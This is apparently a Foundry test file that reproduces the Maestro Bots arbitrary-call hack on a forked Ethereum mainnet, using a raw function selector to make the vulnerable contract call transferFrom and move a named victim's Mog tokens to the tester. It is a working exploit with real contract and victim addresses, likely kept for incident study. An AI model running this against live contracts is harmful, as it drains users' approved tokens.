pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// https://github.com/foundry-rs/foundry/issues/4916
// forge test --match-path test/PoC/11.MaestroBots@arbitrary-call.sol --offline -vvvv --evm-version 'shanghai'

contract ContractTest is Test {
    address public storageContract = 0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e;
    IERC20 public Mog = IERC20(0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a);
    address public logicContract = 0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a;
    // 模拟其中一个受害者
    address victim = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;

    function setUp() public{
        vm.createSelectFork("mainnet", 18_423_219); // 攻击在18_432_662
    }

    function test_exploit() public{

        uint256 attackBefore = Mog.balanceOf(address(this));
        console.log("before attack, Mog balance", attackBefore);

        uint256 allowance = Mog.allowance(victim, storageContract);
        uint256 balance = Mog.balanceOf(victim);
        balance = allowance < balance ? allowance : balance;

        // 从调用关系可以知道，攻击者使用了`transferFrom`
        bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), balance);

        address(storageContract).call(abi.encodeWithSelector(
            // 需要调用的方法
            hex"9239127f",
            // token
            uint256(uint160(address(Mog))), 
            // 对于token需要调用的数据
            data,
            // 不太清楚后面两个参数干嘛用的，不了解这个项目
            uint256(0),
            uint256(0)
        ));

        uint256 attackAfter = Mog.balanceOf(address(this));
        console.log("after attack, Mog balance", attackAfter);

        // 检测是否获利
        assertGt(attackAfter, attackBefore);

    }
}